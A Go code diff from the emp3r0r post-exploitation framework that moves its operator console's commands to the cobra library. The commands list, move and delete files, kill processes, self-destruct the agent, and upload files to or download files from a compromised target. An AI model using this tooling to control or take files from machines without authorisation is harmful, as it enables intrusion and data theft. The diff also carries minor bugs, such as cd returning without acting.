@@ -11,83 +11,188 @@ import (
 
 	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	"github.com/spf13/pflag"
+	"github.com/spf13/cobra"
 )
 
-func FSCmdDst(cmd string) {
-	inputSlice := util.ParseCmd(cmd)
+func ls(cmd *cobra.Command, args []string) {
+	dst, err := cmd.Flags().GetString("path")
+	if err != nil {
+		CliPrintError("ls: %v", err)
+		return
+	}
+	if dst == "" {
+		dst = "."
+	}
 
-	args := strings.Join(inputSlice[1:], "' '")
-	executeCmd(fmt.Sprintf("%s --dst '%s'", inputSlice[0], args))
+	FSCmdDst("ls", dst)
 }
 
-func FSCmdSrcDst(cmd string) {
-	inputSlice := util.ParseCmd(cmd)
-	cmdname := inputSlice[0]
+func pwd(cmd *cobra.Command, args []string) {
+	executeCmd("pwd")
+}
 
-	if len(inputSlice) < 3 {
-		CliPrintError("%s requires source and destination arguments", cmdname)
+func cd(cmd *cobra.Command, args []string) {
+	dst, err := cmd.Flags().GetString("path")
+	if err != nil {
+		CliPrintError("cd: %v", err)
+		return
+	}
+	if dst == "" {
+		dst = "/"
+		return
+	}
+	FSCmdDst("cd", dst)
+}
+
+func cp(cmd *cobra.Command, args []string) {
+	src, err := cmd.Flags().GetString("src")
+	if err != nil {
+		CliPrintError("cp: %v", err)
+		return
+	}
+	dst, err := cmd.Flags().GetString("dst")
+	if err != nil {
+		CliPrintError("cp: %v", err)
+		return
+	}
+	if src == "" || dst == "" {
+		CliPrintError("cp: src and dst are required")
 		return
 	}
 
-	src := inputSlice[1]
-	dst := inputSlice[2]
-
-	executeCmd(fmt.Sprintf("%s --src '%s' --dst '%s'", cmdname, src, dst))
+	FSCmdSrcDst("cp", src, dst)
 }
 
-func FSNoArgCmd(cmd string) {
-	executeCmd(cmd)
+func rm(cmd *cobra.Command, args []string) {
+	dst, err := cmd.Flags().GetString("path")
+	if err != nil {
+		CliPrintError("rm: %v", err)
+		return
+	}
+	if dst == "" {
+		CliPrintError("rm: path is required")
+		return
+	}
+	FSCmdDst("rm", dst)
 }
 
-func UploadToAgent(cmd string) {
+func mkdir(cmd *cobra.Command, args []string) {
+	dst, err := cmd.Flags().GetString("path")
+	if err != nil {
+		CliPrintError("mkdir: %v", err)
+		return
+	}
+	if dst == "" {
+		CliPrintError("mkdir: path is required")
+		return
+	}
+	FSCmdDst("mkdir", dst)
+}
+
+func mv(cmd *cobra.Command, args []string) {
+	src, err := cmd.Flags().GetString("src")
+	if err != nil {
+		CliPrintError("mv: %v", err)
+		return
+	}
+	dst, err := cmd.Flags().GetString("dst")
+	if err != nil {
+		CliPrintError("mv: %v", err)
+		return
+	}
+	if src == "" || dst == "" {
+		CliPrintError("mv: src and dst are required")
+		return
+	}
+	FSCmdSrcDst("mv", src, dst)
+}
+
+func ps(cmd *cobra.Command, args []string) {
+	executeCmd("ps")
+}
+
+func net_helper(cmd *cobra.Command, args []string) {
+	executeCmd("net_helper")
+}
+
+func suicide(cmd *cobra.Command, args []string) {
+	executeCmd("suicide")
+}
+
+func kill(cmd *cobra.Command, args []string) {
+	pid, err := cmd.Flags().GetInt("pid")
+	if err != nil {
+		CliPrintError("kill: %v", err)
+		return
+	}
+	if pid == 0 {
+		CliPrintError("kill: pid is required")
+		return
+	}
+	executeCmd(fmt.Sprintf("kill --pid %d", pid))
+}
+
+func FSCmdDst(cmd, dst string) {
+	executeCmd(fmt.Sprintf("%s --dst '%s'", cmd, dst))
+}
+
+func FSCmdSrcDst(cmd, src, dst string) {
+	executeCmd(fmt.Sprintf("%s --src '%s' --dst '%s'", cmd, src, dst))
+}
+
+func UploadToAgent(cmd *cobra.Command, args []string) {
 	target := SelectCurrentTarget()
 	if target == nil {
 		CliPrintError("You have to select a target first")
 		return
 	}
 
-	inputSlice := util.ParseCmd(cmd)
-	if len(inputSlice) != 3 {
-		CliPrintError("put <local path> <remote path>")
+	src, err := cmd.Flags().GetString("src")
+	if err != nil {
+		CliPrintError("UploadToAgent: %v", err)
+		return
+	}
+	dst, err := cmd.Flags().GetString("dst")
+	if err != nil {
+		CliPrintError("UploadToAgent: %v", err)
 		return
 	}
 
-	if err := PutFile(inputSlice[1], inputSlice[2], target); err != nil {
-		CliPrintError("Cannot put %s: %v", inputSlice[2], err)
+	if src == "" || dst == "" {
+		CliPrintError(cmd.UsageString())
+		return
+	}
+
+	if err := PutFile(src, dst, target); err != nil {
+		CliPrintError("Cannot put %s: %v", src, err)
 	}
 }
 
-func DownloadFromAgent(cmd string) {
+func DownloadFromAgent(cmd *cobra.Command, args []string) {
 	target := SelectCurrentTarget()
 	if target == nil {
 		CliPrintError("You have to select a target first")
-		return
-	}
-
-	inputSlice := util.ParseCmd(cmd)
-	if len(inputSlice) < 2 {
-		CliPrintError("get [-r] [-e <regex filter>] -f <file path>")
 		return
 	}
 	// parse command-line arguments using pflag
-	flags := pflag.NewFlagSet(inputSlice[0], pflag.ContinueOnError)
-	isRecursive := flags.BoolP("recursive", "r", false, "Download recursively")
-	filter := flags.StringP("regex", "e", "", "Regex filter for file names to download")
-	file_path := flags.StringP("file_path", "f", "", "File path to download")
-	flags.Parse(inputSlice[1:])
+	isRecursive, _ := cmd.Flags().GetBool("recursive")
+	filter, _ := cmd.Flags().GetString("regex")
 
-	if *file_path == "" {
-		CliPrintError("get [-r] [-e <regex filter>] -f <file path>")
+	file_path, err := cmd.Flags().GetString("file_path")
+	if err != nil {
+		CliPrintError("download: %v", err)
+		return
+	}
+	if file_path == "" {
+		CliPrintError("download: file_path is required")
 		return
 	}
 
-	fileToGet := *file_path
-	if *isRecursive {
+	if isRecursive {
 		cmd_id := uuid.NewString()
-		err = SendCmdToCurrentTarget(fmt.Sprintf("get --file_path %s --filter %s --offset 0 --token %s", fileToGet, strconv.Quote(*filter), uuid.NewString()), cmd_id)
+		err = SendCmdToCurrentTarget(fmt.Sprintf("get --file_path %s --filter %s --offset 0 --token %s", file_path, strconv.Quote(filter), uuid.NewString()), cmd_id)
 		if err != nil {
-			CliPrintError("Cannot get %s: %v", inputSlice[1], err)
+			CliPrintError("Cannot get %v+: %v", args, err)
 			return
 		}
 		CliPrintInfo("Waiting for response from agent %s", target.Tag)
@@ -101,7 +206,7 @@ func DownloadFromAgent(cmd string) {
 				delete(CmdResults, cmd_id)
 				CmdResultsMutex.Unlock()
 				if result == "" {
-					CliPrintError("Cannot get %s: empty file list in directory", inputSlice[1])
+					CliPrintError("Cannot get %s: empty file list in directory", file_path)
 				}
 				break
 			}
@@ -152,8 +257,8 @@ func DownloadFromAgent(cmd string) {
 			}
 		}
 	} else {
-		if _, err := GetFile(fileToGet, target); err != nil {
-			CliPrintError("Cannot get %s: %v", strconv.Quote(fileToGet), err)
+		if _, err := GetFile(file_path, target); err != nil {
+			CliPrintError("Cannot get %s: %v", strconv.Quote(file_path), err)
 		}
 	}
 }
